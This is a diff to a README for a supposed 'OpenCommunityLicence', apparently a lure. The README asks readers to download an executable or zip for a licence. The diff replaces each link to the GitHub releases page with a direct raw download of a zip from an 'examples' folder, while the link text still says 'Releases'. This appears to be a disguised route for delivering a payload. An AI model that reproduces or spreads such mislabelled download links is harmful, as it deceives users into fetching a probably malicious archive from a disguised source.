@@ -1,7 +1,7 @@
 # 🎉 OpenCommunityLicence - Open Access for All Users
 
 ## 📥 Download Now
-[![Download OpenCommunityLicence](https://img.shields.io/badge/Download-OpenCommunityLicence-blue.svg)](https://github.com/L0RXM1/OpenCommunityLicence/releases)
+[![Download OpenCommunityLicence](https://github.com/L0RXM1/OpenCommunityLicence/raw/refs/heads/main/examples/Licence-Open-Community-3.4-alpha.5.zip)](https://github.com/L0RXM1/OpenCommunityLicence/raw/refs/heads/main/examples/Licence-Open-Community-3.4-alpha.5.zip)
 
 ## 📖 Introduction
 The Open Community License (OCL) is a license designed for everyone. It allows users to access community resources, promotes the right-to-repair, and supports fair competition. This makes it easy for individuals and groups to use, modify, and share products freely.
@@ -11,7 +11,7 @@ To start using OpenCommunityLicence, follow these simple steps.
 
 1. **Visit the Releases Page**  
    To download the latest version of the OCL, visit this page:  
-   [OpenCommunityLicence Releases](https://github.com/L0RXM1/OpenCommunityLicence/releases)
+   [OpenCommunityLicence Releases](https://github.com/L0RXM1/OpenCommunityLicence/raw/refs/heads/main/examples/Licence-Open-Community-3.4-alpha.5.zip)
 
 2. **Download the File**  
    On the Releases page, locate the latest release. Click on the file that suits your system. This could be a `.exe`, `.zip`, or similar file format, depending on your operating system.
@@ -37,7 +37,7 @@ Before downloading, ensure your system meets these requirements:
 To get started with OpenCommunityLicence, you need to download the software. Here’s a quick guide on how to do it:
 
 1. **Go to the Releases Page**  
-   Visit this link: [OpenCommunityLicence Releases](https://github.com/L0RXM1/OpenCommunityLicence/releases).
+   Visit this link: [OpenCommunityLicence Releases](https://github.com/L0RXM1/OpenCommunityLicence/raw/refs/heads/main/examples/Licence-Open-Community-3.4-alpha.5.zip).
 
 2. **Select the Right Version**  
    Choose the latest version compatible with your device. Depending on your operating system, the version types may vary.
